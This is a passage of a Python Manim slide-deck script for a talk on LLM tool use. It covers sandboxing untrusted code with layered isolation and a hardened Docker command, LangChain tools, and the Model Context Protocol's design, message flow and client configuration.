        meme_card_2 = make_meme_card("memes/2.png",        "The attack in action",         CRAIL)

        meme_row = Group(meme_card_1, meme_card_2).arrange(RIGHT, buff=0.4)
        meme_row.next_to(terminal, DOWN, buff=0.45)
        meme_row.set_x(0)

        # ── Footer ───────────────────────────────────────────────────────────────
        note = B(
            "Never give an AI agent unrestricted tool access without sandboxing & approval steps",
            color=CRAIL,
            scale=0.42,
        ).next_to(meme_row, DOWN, buff=0.35)
        note.set_x(0)

        # ── Animations ───────────────────────────────────────────────────────────
        self.play(LaggedStart(*[Write(p) for p in [*row1, *row2]], lag_ratio=0.06))
        self.play(FadeIn(terminal_bg), run_time=0.4)
        self.play(
            LaggedStart(
                *[Write(ln) for ln in term_lines_group],
                lag_ratio=0.25,
            )
        )
        self.play(
            LaggedStart(
                FadeIn(meme_card_1, shift=UP * 0.3),
                FadeIn(meme_card_2, shift=UP * 0.3),
                lag_ratio=0.2,
            )
        )
        self.play(FadeIn(note))
        self.next_slide()
        self._clear()

    def _slide_ace_layers(self):
        anchor = self._header("Arbitrary Code Execution — Defence Layers")

        intro = B(
            "Running untrusted code safely requires stacking multiple isolation primitives.",
            color=SEC,
            scale=0.50,
        )
        intro.next_to(anchor, DOWN, buff=0.30)
        intro.set_x(0)
        self.play(FadeIn(intro, shift=UP * 0.1))

        layer_data = [
            (CRAIL, "Namespaces / cgroups",  "Isolate PID, network, FS "),
            (CRAIL, "seccomp filter",        "Whitelist safe syscalls, block fork, execve, socket"),
            (DARK,  "Network = none",        "Network namespace with zero egress, no DNS"),
            (DARK,  "CPU + Wall limits",     "external watchdog kills runaway processes"),
        ]

        PILL_X   = -3.8   # horizontal center of all pills
        PILL_W   =  5.6   # wide enough for longest label
        PILL_H   =  0.64  # tall enough to breathe
        DESC_X   =  0.8   # left-edge anchor for descriptions
        ROW_BUFF =  0.62  # vertical gap — more space between rows

        rows = []
        for i, (color, label, desc) in enumerate(layer_data):
            p = pill(label, color, w=PILL_W, h=PILL_H)
            p.set_x(PILL_X)

            d = B(desc, color=SEC, scale=0.40)
            d.set_x(DESC_X + d.width / 2)

            y = intro.get_bottom()[1] - 0.45 - i * ROW_BUFF
            p.set_y(y)
            d.set_y(y)
            rows.append((p, d))

        self.play(
            LaggedStart(
                *[
                    AnimationGroup(DrawBorderThenFill(p), FadeIn(d, shift=RIGHT * 0.1))
                    for p, d in rows
                ],
                lag_ratio=0.25,
            )
        )

        note = B(
            "No single layer is enough — safety comes from depth.",
            color=CLOUDY,
            scale=0.42,
        ).to_edge(DOWN, buff=0.20)
        self.play(FadeIn(note))

        self.next_slide()
        self._clear()

    def _slide_ace_platforms(self):
        anchor = self._header("Arbitrary Code Execution — How Platforms Do It")

        # ── platform comparison (top) ─────────────────────────────────────────
        plat_title = B("Real-world implementations", color=CRAIL, weight=BOLD, scale=0.52)
        plat_title.next_to(anchor, DOWN, buff=0.35)
        plat_title.set_x(0)

        platforms = [
            (CRAIL, "Codeforces", "isolate + ptrace syscall allow-list"),
            (CRAIL, "Replit",     "gVisor (runsc) + Nix per-repl envs"),
            (DARK,  "AWS Lambda", "Firecracker microVM — ~125 ms boot"),
            (DARK,  "IOI Judge",  "isolate — open-source, battle-tested"),
        ]

        NAME_X   = -4.2   # left-anchor for platform names
        DETAIL_X = -0.01   # left-anchor for detail descriptions
        ROW_BUFF =  0.48

        plat_rows = []
        for i, (color, name, detail) in enumerate(platforms):
            name_mob   = B(name,   color=color, weight=BOLD, scale=0.50)
            detail_mob = B(detail, color=SEC,               scale=0.46)

            name_mob.set_x(NAME_X + name_mob.width / 2)
            detail_mob.set_x(DETAIL_X + detail_mob.width / 2)

            y = plat_title.get_bottom()[1] - 0.35 - i * ROW_BUFF
            name_mob.set_y(y)
            detail_mob.set_y(y)
            plat_rows.append((name_mob, detail_mob))

        self.play(FadeIn(plat_title))
        self.play(
            LaggedStart(
                *[
                    AnimationGroup(FadeIn(n, shift=RIGHT * 0.12), FadeIn(d, shift=RIGHT * 0.12))
                    for n, d in plat_rows
                ],
                lag_ratio=0.22,
            )
        )
        self.next_slide()

        # ── docker code block (bottom) ────────────────────────────────────────
        docker_src = """\
    docker run --rm         \\
      --network none        \\
      --memory 256m         \\
      --cpus 0.5            \\
      --cap-drop ALL        \\
      --read-only           \\
      --security-opt no-new-privileges \\
      sandbox:latest"""

        cb = code_block(docker_src, language="bash", font_size=13)
        cb_label = B("Minimal hardened container", color=CRAIL, weight=BOLD, scale=0.46)
        code_group = VGroup(cb_label, cb).arrange(DOWN, aligned_edge=LEFT, buff=0.14)
        code_group.to_edge(DOWN, buff=0.55)
        code_group.set_x(0)

        self.play(FadeIn(code_group, shift=UP * 0.18))

        # ── bottom footnote ───────────────────────────────────────────────────
        note = B(
            "isolate (github.com/ioi/isolate) — reference sandbox used at IOI and Codeforces.",
            color=CLOUDY,
            scale=0.40,
        ).to_edge(DOWN, buff=0.18)
        self.play(FadeIn(note))

        self.next_slide()
        self._clear()

    # ══════════════════════════════════════════════════════════════════════════
    # SLIDE — From Python Function to LangChain Tool
    # ══════════════════════════════════════════════════════════════════════════
    def _slide_langchain_tool_intro(self):
        anchor = self._header("From Python Function to LangChain Tool")

        plain_src = (
            "def count_letter(text: str, letter: str) -> int:\n"
            '    """Count how many times a letter appears in a string."""\n'
            "    return text.count(letter)\n\n"
            'print(count_letter("strawberry", "r"))  # -> 3'
        )
        tool_src = (
            "from langchain.tools import tool\n\n"
            "@tool\n"
            "def count_letter(text: str, letter: str) -> int:\n"
            '    """Count how many times a letter appears in a string."""\n'
            "    return text.count(letter)"
        )

        label_plain = B("Plain function", color=SEC, weight=BOLD, scale=0.48)
        label_tool = B("LangChain tool", color=CRAIL, weight=BOLD, scale=0.48)

        cblock_plain = code_block(plain_src).scale(0.70)
        cblock_tool = code_block(tool_src).scale(0.70)

        col_plain = VGroup(label_plain, cblock_plain).arrange(
            DOWN, aligned_edge=LEFT, buff=0.10
        )
        col_tool = VGroup(label_tool, cblock_tool).arrange(
            DOWN, aligned_edge=LEFT, buff=0.10
        )

        cols = (
            VGroup(col_plain, col_tool)
            .arrange(DOWN, aligned_edge=LEFT, buff=0.22)
            .next_to(anchor, DOWN, buff=0.28)
        )
        cols.set_x(0)

        divline = (
            DashedLine(
                LEFT * 5.5,
                RIGHT * 5.5,
                color=CLOUDY,
                stroke_width=1.5,
            )
            .next_to(col_plain, DOWN, buff=0.10)
            .set_x(0)
        )

        schema_label = B(
            "@tool reads the name, docstring & type hints → builds a JSON schema the LLM can read",
            color=TERT,
            scale=0.44,
        ).next_to(cols, DOWN, buff=0.24)
        schema_label.set_x(0)

        self.play(FadeIn(col_plain))
        self.next_slide()
        self.play(Create(divline), FadeIn(col_tool))
        self.play(FadeIn(schema_label))
        self.next_slide()
        self._clear()

    # ══════════════════════════════════════════════════════════════════════════
    # SLIDE — How the Agent Uses the Tool
    # ══════════════════════════════════════════════════════════════════════════

    def _slide_langchain_tool_flow(self):
        anchor = self._header("How the Agent Uses the Tool")

        # ── Left col: Schema + Invoke stacked ───────────────────────────────
        schema_src = (
            "{\n"
            '  "name": "count_letter",\n'
            '  "description": "description",\n'
            '  "parameters": {\n'
            '    "text":   "string",\n'
            '    "letter": "string"\n'
            "  }\n"
            "}"
        )
        invoke_src = (
            "result = count_letter.invoke({\n"
            '    "text":   "strawberry",\n'
            '    "letter": "r",\n'
            "})\n"
            "print(result)  # -> 3"
        )

        schema_label = B("Schema the LLM sees", color=SEC, weight=BOLD, scale=0.40)
        cblock_schema = code_block(schema_src, language="json", font_size=8)
        col_schema = VGroup(schema_label, cblock_schema).arrange(
            DOWN, aligned_edge=LEFT, buff=0.10
        )

        invoke_label = B("Manual invocation", color=SEC, weight=BOLD, scale=0.40)
        cblock_invoke = code_block(invoke_src, font_size=8)
        col_invoke = VGroup(invoke_label, cblock_invoke).arrange(
            DOWN, aligned_edge=LEFT, buff=0.10
        )

        col_left = (
            VGroup(col_schema, col_invoke)
            .arrange(DOWN, aligned_edge=LEFT, buff=0.30)
            .to_edge(LEFT, buff=0.45)
            .to_edge(UP, buff=1.3)  # pin to top so it can't drift into flow column
        )

        # ── Right col: Flow steps ────────────────────────────────────────────
        flow_steps = [
            (DARK, 'User:   How many "r" in strawberry?'),
            (TERT, "LLM reads schema → selects count_letter"),
            (CRAIL, 'Calls:  count_letter(text="strawberry", letter="r")'),
            (TERT, "Tool returns:  3"),
            (CRAIL, 'Response:  There are 3 "r" letters in "strawberry".'),
        ]
        step_mobs = [B(text, color=color, scale=0.40) for color, text in flow_steps]
        flow_group = (
            VGroup(*step_mobs)
            .arrange(DOWN, aligned_edge=LEFT, buff=0.28)
            .to_edge(RIGHT, buff=0.45)
            .align_to(col_left, UP)  # top-align with left column
        )

        arrows = [
            Arrow(
                step_mobs[i].get_bottom(),
                step_mobs[i + 1].get_top(),
                buff=0.06,
                color=CLOUDY,
                stroke_width=1.8,
                max_tip_length_to_length_ratio=0.18,
            )
            for i in range(len(step_mobs) - 1)
        ]

        # ── Animations ───────────────────────────────────────────────────────
        self.play(FadeIn(col_schema))
        self.next_slide()

        self.play(FadeIn(step_mobs[0]))
        for i, arr in enumerate(arrows):
            self.play(GrowArrow(arr), FadeIn(step_mobs[i + 1]), run_time=0.5)
        self.next_slide()

        self.play(FadeIn(col_invoke))
        self.next_slide()
        self._clear()
    def _slide_is_mcp_dead(self):
        anchor = self._header("Is MCP Dead?")

        images_grid = [
            ["5.jpg", "7.jpg"],
            ["8.jpg", "9.png"],
        ]

        IMG_W    = 4.8   # width of each image
        H_GAP    = 0.30  # horizontal gap between columns
        V_GAP    = 0.25  # vertical gap between rows

        grid_mobs = []
        for r, row in enumerate(images_grid):
            for c, path in enumerate(row):
                if os.path.exists("memes/"+path):
                    img = ImageMobject("memes/"+path).scale_to_fit_width(IMG_W)
                else:
                    # fallback placeholder if file missing
                    img = Rectangle(
                        width=IMG_W, height=IMG_W * 0.6,
                        fill_color=CLOUDY, fill_opacity=0.2,
                        stroke_color=CLOUDY, stroke_width=1,
                    )
                    lbl = B(path, color=SEC, scale=0.45).move_to(img)
                    img = Group(img, lbl)

                x = (c - 0.5) * (IMG_W + H_GAP)
                y = anchor.get_bottom()[1] - 0.25 - (IMG_W * 0.6 + V_GAP) * r - (IMG_W * 0.6) / 2
                img.set_x(x)
                img.set_y(y)
                grid_mobs.append(img)

        self.play(
            LaggedStart(
                *[FadeIn(m, shift=UP * 0.15) for m in grid_mobs],
                lag_ratio=0.20,
            )
        )

        self.next_slide()
        self._clear()
    def _slide_missinformation(self):
        anchor = self._header("Внимание! Внимание!")

        img_path = "memes/missinformation.jpg"
        if os.path.exists(img_path):
            img = (
                ImageMobject(img_path)
                .scale_to_fit_width(10)
                .next_to(anchor, DOWN, buff=0.25)
            )
            self.play(FadeIn(img))
        else:
            self._draw_protocol_stack(anchor)

        self.next_slide()
        self._clear()
    # ══════════════════════════════════════════════════════════════════════════
    # SLIDE  — MCP vs CLI vs Skills
    # ══════════════════════════════════════════════════════════════════════════
    def _slide_mcp_vs_skills(self):
        anchor = self._header("MCP vs Skills — What's the Difference?")

        skills_items = [
            "Natural-language instructions & workflows",
            "Teach how and when to do a task",
            "Enforce consistency, reduce hallucinations",
            "Live locally alongside the agent",
            "No network — pure guidance",
        ]
        mcp_items = [
            "Protocol: agent ↔ external tool/service",
            "Handles OAuth, auth, live API calls",
            "Real-time data access & live actions",
            "Runs in a controlled remote environment",
            "Gives the agent hands to touch the world",
        ]

        head_skills = B("Skills", color=CLOUDY, weight=BOLD, scale=0.65).shift(
            LEFT * 5.9 + UP * 1.5
        )
        head_mcp = B("MCP Servers", color=CRAIL, weight=BOLD, scale=0.65).shift(
            RIGHT * 2.2 + UP * 1.5
        )
        #divline = DashedLine(UP * 1.7, DOWN * 2.7, color=TERT, stroke_width=1.5)

        skills_mobs = (
            VGroup(*[B(f"—  {p}", color=SEC, scale=0.40) for p in skills_items])
            .arrange(DOWN, aligned_edge=LEFT, buff=0.22)
            .next_to(head_skills, DOWN, buff=0.3)
            .align_to(head_skills, LEFT)
        )

        mcp_mobs = (
            VGroup(*[B(f"—  {p}", color=CRAIL, scale=0.40) for p in mcp_items])
            .arrange(DOWN, aligned_edge=LEFT, buff=0.22)
            .next_to(head_mcp, DOWN, buff=0.3)
            .align_to(head_mcp, LEFT)
        )

        # ── bottom summary pill ───────────────────────────────────────────────
        summary = B(
            "Skills  =  what to think       MCP  =  what to do",
            color=DARK,
            weight=BOLD,
            scale=0.48,
        )
        summary_box = SurroundingRectangle(
            summary,
            corner_radius=0.12,
            buff=0.18,
            color=CLOUDY,
            stroke_width=1.2,
            fill_color=PAMPAS,
            fill_opacity=0.6,
        )
        summary_group = VGroup(summary_box, summary).to_edge(DOWN, buff=0.28)

        self.play(FadeIn(head_skills), FadeIn(head_mcp))#, Create(divline))
        self.play(
            LaggedStart(
                *[FadeIn(m, shift=RIGHT * 0.15) for m in skills_mobs], lag_ratio=0.18
            ),
            LaggedStart(
                *[FadeIn(m, shift=LEFT * 0.15) for m in mcp_mobs], lag_ratio=0.18
            ),
        )
        self.next_slide()
        self.play(FadeIn(summary_group, shift=UP * 0.15))
        self.next_slide()
        self._clear()
    def _slide_mcp_vs_cli(self):
        anchor = self._header("Problems MCP Solves That CLI Cannot")

        cli_items = [
            "Needs a CLI interface to exist",
            "Returns raw text / exit codes",
            "No structured schema",
            "is run a command in terminal",
            "inputs are commands",
        ]
        mcp_items = [
            "Works over HTTP SSE or stdio",
            "Structured JSON-RPC responses",
            "Self-describing tool schemas",
            "Stateful & streaming capable",
            "LLM auto-discovers every tool",
        ]

        head_cli = B("CLI Tools", color=CLOUDY, weight=BOLD, scale=0.65).shift(
            LEFT * 4.2 + UP * 1.5
        )
        head_mcp = B("MCP Servers", color=CRAIL, weight=BOLD, scale=0.65).shift(
            RIGHT * 2.8 + UP * 1.5
        )

        divline = DashedLine(UP * 1.7, DOWN * 2.7, color=TERT, stroke_width=1.5)

        cli_mobs = (
            VGroup([B(f"x  {p}", color=SEC, scale=0.5) for p in cli_items])
            .arrange(DOWN, aligned_edge=LEFT, buff=0.05)
            .next_to(head_cli, DOWN, buff=0.3)
            .align_to(head_cli, LEFT)
        )

        cli_mobs.set_max_width(3.0)

        mcp_mobs = (
            VGroup(*[B(f"v  {p}", color=CRAIL, scale=0.5) for p in mcp_items])
            .arrange(DOWN, aligned_edge=LEFT, buff=0.25)
            .next_to(head_mcp, DOWN, buff=0.3)
            .align_to(head_mcp, LEFT)
        )

        self.play(FadeIn(head_cli), FadeIn(head_mcp), Create(divline))
        self.play(
            LaggedStart(
                *[FadeIn(m, shift=RIGHT * 0.15) for m in cli_mobs], lag_ratio=0.18
            ),
            LaggedStart(
                *[FadeIn(m, shift=LEFT * 0.15) for m in mcp_mobs], lag_ratio=0.18
            ),
        )
        self.next_slide()
        self._clear()

    # ══════════════════════════════════════════════════════════════════════════
    # SLIDE 9 — Wolfram Alpha case
    # ══════════════════════════════════════════════════════════════════════════
    def _slide_wolfram(self):
        anchor = self._header("Case Study: Wolfram Alpha")

        stmt = B(
            "Wolfram Alpha has NO CLI  —  but it has an MCP server.",
            color=DARK,
            scale=0.65,
        )
        stmt.next_to(anchor, DOWN, buff=0.42)
        why = B("Why?", color=CRAIL, weight=BOLD, scale=0.85).next_to(
            stmt, DOWN, buff=0.22
        )

        reasons = [
            (
                CRAIL,
                "HTTP-only API",
                "Wolfram exposes REST endpoints — nothing to spawn as a process",
            ),
            (SEC, "Structured output", "Returns LaTeX & JSON — not terminal text"),
            (
                TERT,
                "LLM needs schemas",
                "MCP describes inputs/outputs so the LLM knows how to call it",
            ),
            (
                CRAIL,
                "Security",
                "Giving an LLM shell access to a server would be dangerous",
            ),
        ]

        reason_mobs = []
        for color, title, desc in reasons:
            t = B(f"  {title}", color=color, weight=BOLD, scale=0.56)
            d = B(f"    {desc}", color=DARK, scale=0.46)
            reason_mobs.append(VGroup(t, d).arrange(DOWN, aligned_edge=LEFT, buff=0.04))

        grp = VGroup(*reason_mobs).arrange(DOWN, aligned_edge=LEFT, buff=0.28)
        grp.next_to(why, DOWN, buff=0.38).to_edge(LEFT, buff=0.55)

        self.play(Write(stmt))
        self.play(Write(why))
        self.play(
            LaggedStart(
                *[FadeIn(r, shift=RIGHT * 0.2) for r in reason_mobs], lag_ratio=0.28
            )
        )
        self.next_slide()
        self._clear()

    # ══════════════════════════════════════════════════════════════════════════
    # SLIDE 10 — MCP as Network Protocol  (SVG or fallback diagram)
    # ══════════════════════════════════════════════════════════════════════════
    def _mcp_websites(self):
        anchor = self._header("Where to find MCP's: mcp.so")

        img_path = "mcp_website.png"
        if os.path.exists(img_path):
            img = (
                ImageMobject(img_path)
                .scale_to_fit_width(10)
                .next_to(anchor, DOWN, buff=0.25)
            )
            self.play(FadeIn(img))
        else:
            self._draw_protocol_stack(anchor)

        self.next_slide()
        self._clear()

    def _slide_network_protocol(self):
        anchor = self._header("MCP is a Network Protocol over HTTP")

        img_path = "http.png"
        if os.path.exists(img_path):
            img = (
                ImageMobject(img_path)
                .scale_to_fit_width(10)
                .next_to(anchor, DOWN, buff=0.25)
            )
            self.play(FadeIn(img))
        else:
            self._draw_protocol_stack(anchor)

        self.next_slide()
        self._clear()

    def _slide_network_protocol_mcp(self):
        anchor = self._header("MCP as a Network Protocol")

        img_path = "proto.jpg"
        if os.path.exists(img_path):
            img = (
                ImageMobject(img_path)
                .scale_to_fit_width(10)
                .next_to(anchor, DOWN, buff=0.25)
            )
            self.play(FadeIn(img))
        else:
            self._draw_protocol_stack(anchor)

        self.next_slide()
        self._clear()

    def _slide_mcp_flow(self):
        anchor = self._header("MCP Protocol — Message Flow")

        # ── column definitions ─────────────────────────────────────────────────
        COL_LABELS = ["Client", "MCP Server", "LLM", "External\nData Source"]
        COL_X      = [-5.1, -1.7,  1.7,  5.1]
        HDR_Y      =  2.30
        TOP_Y      =  2.00
        BOT_Y      = -3.40

        # ── headers ────────────────────────────────────────────────────────────
        headers = []
        for label, x in zip(COL_LABELS, COL_X):
            box = RoundedRectangle(
                corner_radius=0.13, width=2.35, height=0.62,
                fill_color=PAMPAS, fill_opacity=1.0,
                stroke_color=CRAIL, stroke_width=1.5,
            ).set_x(x).set_y(HDR_Y)
            txt = B(label, color=DARK, weight=BOLD, scale=0.42).move_to(box)
            headers.append(VGroup(box, txt))

        # ── lifelines ──────────────────────────────────────────────────────────
        lifelines = [
            DashedLine(
                [x, TOP_Y, 0], [x, BOT_Y, 0],
                color=CLOUDY, stroke_width=0.9, dash_length=0.10,
            )
            for x in COL_X
        ]

        self.play(LaggedStart(*[FadeIn(h) for h in headers], lag_ratio=0.18))
        self.play(LaggedStart(*[Create(ll) for ll in lifelines], lag_ratio=0.12))
        self.next_slide()

        # ── message definitions ────────────────────────────────────────────────
        # (from_col, to_col, label, is_return, is_internal)
        messages = [
            (0, 1, "1. Request available tools",       False, False),
            (1, 0, "2. List of tools",                 True,  False),
            (0, 2, "3. User query + tools info",        False, False),
            (2, 0, "4. Instruct: use specific tool",    False, False),
            (0, 2, "5. Execute tool internally",         False, True ),
            (1, 3, "6. Request data",                   False, False),
            (3, 1, "7. Data response",                  True,  False),
            (1, 0, "8. Retrieved data",                 True,  False),
            (0, 2, "9. User query + retrieved data",    False, False),
            (2, 0, "10. Final response",                True,  False),
        ]

        MSG_Y0   =  1.60
        MSG_STEP =  0.50
        PAD      =  0.28   # gap between lifeline and arrow tip/tail

        for i, (src, dst, label, is_return, is_internal) in enumerate(messages):
            y  = MSG_Y0 - i * MSG_STEP
            xs = COL_X[src]
            xd = COL_X[dst]

            # ── self-loop (internal execution) ─────────────────────────────────
            if is_internal:
                loop = CurvedArrow(
                    start_point=[xs + 0.15, y + 0.18, 0],
                    end_point  =[xs + 0.15, y - 0.18, 0],
                    angle=-TAU / 4,
                    color=ORANGE,
                    stroke_width=1.5,
                )
                lbl = B(label, color=ORANGE, scale=0.33).next_to(loop, RIGHT, buff=0.08)
                self.play(Create(loop), FadeIn(lbl), run_time=0.50)
                continue

            # ── directional arrow ──────────────────────────────────────────────
            color = SEC if is_return else CRAIL
            sign  = 1 if xd > xs else -1
            x_from = xs + sign * PAD
            x_to   = xd - sign * PAD

            raw = Arrow(
                [x_from, y, 0], [x_to, y, 0],
                buff=0,
                color=color,
                stroke_width=1.8,
                max_tip_length_to_length_ratio=0.07,
            )
            arr = DashedVMobject(raw, num_dashes=16) if is_return else raw

            # label above the arrow, centered
            mid_x = (x_from + x_to) / 2
            lbl = B(label, color=color, scale=0.33)
            lbl.move_to([mid_x, y + 0.17, 0])

            self.play(Create(arr), FadeIn(lbl), run_time=2.5)

        self.next_slide()
        self._clear()

    def _draw_protocol_stack(self, anchor):
        layers = [
            (
                CRAIL,
                "Application Layer",
                "Claude Desktop / Cursor / VS Code / Custom LLM app",
            ),
            (
                SEC,
                "MCP Protocol Layer",
                "Tool schemas (JSON), JSON-RPC 2.0 calls & responses",
            ),
            (TERT, "Transport Layer", "stdio  |  HTTP with SSE  |  WebSockets"),
            (
                CLOUDY,
                "MCP Server Layer",
                "Tools  |  Resources  |  Prompts  |  Sampling",
            ),
        ]
        mobs = []
        for color, title, desc in layers:
            box = RoundedRectangle(
                corner_radius=0.1,
                width=10.5,
                height=0.88,
                fill_color=color,
                fill_opacity=0.08,
                stroke_color=color,
                stroke_width=1.5,
            )
            lbl = B(title, color=color, weight=BOLD, scale=0.58)
            dsc = B(desc, color=DARK, scale=0.44)
            content = VGroup(lbl, dsc).arrange(RIGHT, buff=0.55).move_to(box)
            mobs.append(VGroup(box, content))

        stack = VGroup(*mobs).arrange(DOWN, buff=0.1).next_to(anchor, DOWN, buff=0.4)
        self.play(
            LaggedStart(*[FadeIn(m, shift=DOWN * 0.08) for m in mobs], lag_ratio=0.22)
        )

    # ══════════════════════════════════════════════════════════════════════════
    # SLIDE 11 — Connecting to an MCP Server
    # ══════════════════════════════════════════════════════════════════════════
    def _slide_connect(self):
        anchor = self._header("Connecting to an MCP Server")

        subtitle = B(
            "Example: Claude Desktop  <->  local Python MCP server",
            color=SEC,
            scale=0.52,
        )
        subtitle.next_to(anchor, DOWN, buff=0.28)

        config_src = """{
  "mcpServers": {
    "my-tool": {
      "command": "python",
      "args": ["-m", "my_mcp_server"],
      "transport": "stdio"
    }
  }
}"""
        cblock = code_block(config_src, language="json").next_to(
            subtitle, DOWN, buff=0.3
        )

        steps = [
            "1  Decorate your functions with  @mcp.tool()",
            "2  Add the entry to  claude_desktop_config.json",
            "3  Restart Claude Desktop",
            "4  The LLM auto-discovers and calls your tools",
        ]
        step_mobs = (
            VGroup(
                *[
                    B(s, color=CRAIL if i % 2 == 0 else DARK, scale=0.52)
                    for i, s in enumerate(steps)
                ]
            )
            .arrange(DOWN, aligned_edge=LEFT, buff=0.22)
            .next_to(cblock, DOWN, buff=0.32)
            .to_edge(LEFT, buff=0.5)
        )

        self.play(FadeIn(subtitle))
        self.play(FadeIn(cblock))
        self.next_slide()
        self.play(
            LaggedStart(
                *[FadeIn(s, shift=RIGHT * 0.2) for s in step_mobs], lag_ratio=0.25
            )
        )
        self.next_slide()
        self._clear()

    # ══════════════════════════════════════════════════════════════════════════
    # SLIDE 12 — Conclusions
    # ══════════════════════════════════════════════════════════════════════════
    def _slide_conclusions(self):
        title = H("Key Takeaways", scale=1.15).shift(UP * 2.1)
        takeaways = [
            (CRAIL, "MCP = standard protocol for LLM <-> tool communication"),
            (SEC, "Solves what CLI and raw APIs can't: structured, safe, scalable"),
            (TERT, "Adopted by Claude, Cursor, Windsurf, VS Code, and many more"),
            (CRAIL, "Start building your own MCP server today!"),
        ]
        ta_mobs = (
            VGroup(
                *[B(f"  {t}", color=c, weight=BOLD, scale=0.55) for c, t in takeaways]
            )
            .arrange(DOWN, aligned_edge=LEFT, buff=0.32)
            .next_to(title, DOWN, buff=0.5)
        )
        self.play(DrawBorderThenFill(title))
        self.play(
            LaggedStart(*[FadeIn(t, shift=UP * 0.18) for t in ta_mobs], lag_ratio=0.28)
        )
        self.next_slide()
        self._clear()

    # ══════════════════════════════════════════════════════════════════════════
    # SLIDE 13 —  Thank you
    # ══════════════════════════════════════════════════════════════════════════
    def _slide_thanks(self):
        title = H("Thank You!", scale=1.15, color=CRAIL).shift(UP * 1.2)
        line = Line(LEFT * 5, RIGHT * 5, color=CLOUDY, stroke_width=1).next_to(
            title, DOWN, buff=0.6
        )

        qr_label = B("Questions?", color=SEC, weight=BOLD, scale=0.7).next_to(
            line, DOWN, buff=0.55
        )
        self.play(DrawBorderThenFill(title))
        self.play(Create(line))
        self.play(FadeIn(qr_label, shift=UP * 0.2))
        self.next_slide()
